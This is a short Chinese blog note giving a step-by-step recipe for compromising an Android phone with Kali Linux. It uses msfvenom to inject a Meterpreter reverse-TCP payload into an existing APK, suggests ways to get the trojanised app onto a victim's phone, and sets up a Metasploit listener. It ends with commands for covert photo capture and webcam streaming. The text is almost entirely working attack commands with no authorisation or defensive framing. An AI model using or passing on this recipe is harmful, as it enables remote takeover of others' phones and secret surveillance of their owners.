---
title: kali渗透测试android
description: kali渗透测试android
data: 2022-12-18 20:42:00
updata: 2022-12-18 20:42:00
tags: 
  - linux
categories:
  - linux笔记
---
#### 环境: kali linux

#### 目标：一台安卓机

ifconfig查看虚拟机ip

在终端输入命令

```c
msfvenom -a java --platform android -p android/meterpreter/reverse_tcp lhost=虚拟机ip lport=监听端口（例：3333） -x test.apk R > apk.apk 
```

在/home/用户名 文件夹中找到apk.apk文件，想办法给手机安装（微信传输会添加拓展名，QQ不会）

在终端输入

```c
msfconsole
```

启动终端，然后一次输入下列

```c
1.use exploit/multi/handler 加载模块
2.set payload android/meterpreter/reverse_tcp  选择Payload
3.show options 查看参数设置
4.set LHOST 虚拟机IP
5.set LPORT 监听端口（此处必须和前面一样）
6.exploit 开始监听
```

如果手机上安装了木马，就会看见一个会话连接

以下是以下操作命令

```c
sysinfo 查看手机操作系统
webcam_list 查看手机摄影头有几个
webcam_snap 隐秘拍照功能
webcam_stream 开启摄像头
```

